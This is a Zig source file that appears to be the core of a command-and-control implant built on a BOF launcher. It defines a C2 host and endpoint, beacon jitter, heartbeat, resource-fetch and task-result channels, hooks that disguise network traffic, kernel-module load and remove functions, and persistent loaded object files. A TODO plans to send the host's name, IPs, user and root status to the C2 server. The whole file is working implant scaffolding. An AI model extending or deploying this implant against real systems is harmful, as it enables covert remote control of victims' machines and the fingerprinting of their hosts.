const std = @import("std");
const bof = @import("bof_launcher_api");

pub const BofRes = extern struct {
    status_code: i32 = 0,
    output: ?[*]const u8 = null,
    len: u32 = 0,
    taskID: [*:0]const u8 = undefined,
};

pub const netConnectionType = enum(u8) {
    Heartbeat,
    ResourceFetch,
    TaskResult,
};

const PendingBof = struct {
    context: ?*bof.Context = null,
    task_id: []const u8,
    is_persistent: bool = false,
    launcher_error_code: i32 = 0,
};

pub const ImplantActions = struct {
    const Self = @This();

    netInit: *const fn (state: *anyopaque) callconv(.c) *anyopaque = undefined,

    netConnect: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque) callconv(.c) ?*anyopaque = undefined,
    netDisconnect: *const fn (state: *anyopaque, conn: *anyopaque) callconv(.c) void = undefined,

    netExchange: *const fn (state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.c) ?*anyopaque = undefined,

    netUnmasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque, len: *u32) callconv(.c) ?*anyopaque = undefined,
    netMasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.c) ?*anyopaque = undefined,

    kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.c) c_int = null,
    kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.c) c_int = null,

    pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
        const fields = @typeInfo(Self).@"struct".fields;

        var ptr_table: [fields.len]usize = undefined;

        inline for (fields, 0..) |_, i| {
            ptr_table[i] = @intFromPtr(self) + i * @sizeOf(usize);
        }

        inline for (fields, 0..) |field, i| {
            @as(*usize, @ptrFromInt(ptr_table[i])).* = @intFromPtr(bofObj.getProcAddress(field.name));
        }
    }
};

pub const State = struct {
    const Self = @This();

    allocator: std.mem.Allocator,
    net_client: *anyopaque = undefined,

    implant_identity: []u8,
    implant_actions: ImplantActions,

    jitter: u32,

    c2_host: []const u8,
    c2_endpoint: []const u8,
    assets_host: []const u8,

    pending_bofs: std.array_list.Managed(PendingBof),
    persistent_bofs: std.AutoHashMap(u64, bof.Object),

    base64_decoder: std.base64.Base64Decoder,
    base64_encoder: std.base64.Base64Encoder,

    fn getImplantIdentity(allocator: std.mem.Allocator) ![]u8 {
        const arch_name = @tagName(@import("builtin").cpu.arch);
        const os_release = @tagName(@import("builtin").os.tag);

        // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
        const implant_id = try std.mem.join(allocator, "", &.{
            arch_name,
            ":",
            os_release,
        });

        return implant_id;
    }

    pub fn init(allocator: std.mem.Allocator, implantActions: ImplantActions) !State {
        const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');

        const implant_identity = try getImplantIdentity(allocator);

        const implant_actions: ImplantActions = .{
            .netInit = implantActions.netInit,
            .netConnect = implantActions.netConnect,
            .netDisconnect = implantActions.netDisconnect,
            .netExchange = implantActions.netExchange,
            .netUnmasquerade = implantActions.netUnmasquerade,
            .netMasquerade = implantActions.netMasquerade,
        };

        const net_client = implant_actions.netInit(@constCast(@ptrCast(&allocator)));

        //TODO: move it to ImplanActions.netMasquarede(...) function
        const implant_identity_b64 = try allocator.alloc(u8, base64_encoder.calcSize(implant_identity.len));
        _ = std.base64.Base64Encoder.encode(&base64_encoder, implant_identity_b64, implant_identity);

        return State{
            .allocator = allocator,
            .net_client = net_client,

            .implant_identity = implant_identity_b64,
            .implant_actions = implant_actions,

            .jitter = 3,

            .c2_host = "127.0.0.1:8000",
            .c2_endpoint = "/endpoint",
            .assets_host = "127.0.0.1:8000",

            .base64_decoder = base64_decoder,
            .base64_encoder = base64_encoder,

            .pending_bofs = std.array_list.Managed(PendingBof).init(allocator),
            .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
        };
    }

    fn deinit(state: *State, allocator: std.mem.Allocator) void {
        allocator.free(state.implant_identity);

        state.pending_bofs.deinit();
        state.persistent_bofs.deinit();
        state.* = undefined;
    }
};

